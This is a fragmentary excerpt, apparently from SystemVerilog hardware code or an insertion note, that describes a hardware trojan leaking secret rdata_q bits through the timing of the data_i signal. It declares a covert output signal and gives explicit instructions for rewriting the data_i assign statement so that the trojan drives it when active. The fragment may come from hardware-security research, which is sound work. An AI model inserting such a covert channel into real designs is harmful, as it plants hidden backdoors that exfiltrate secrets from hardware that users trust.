 ...
 * Payload: Modulate data_i timing to leak secret data
 * 
...
// ============================================================
// Leaks rdata_q bits through timing of data_i:
...
logic       covert_bit_out;         // Drives data_i when trojan active
...
//   Find the assign for data_i (or rd_error_o as fallback):
//     assign data_i = <normal_expr>;
//   Replace with:
//     assign data_i = trojan_active ? covert_bit_out : (<normal_expr>);
//
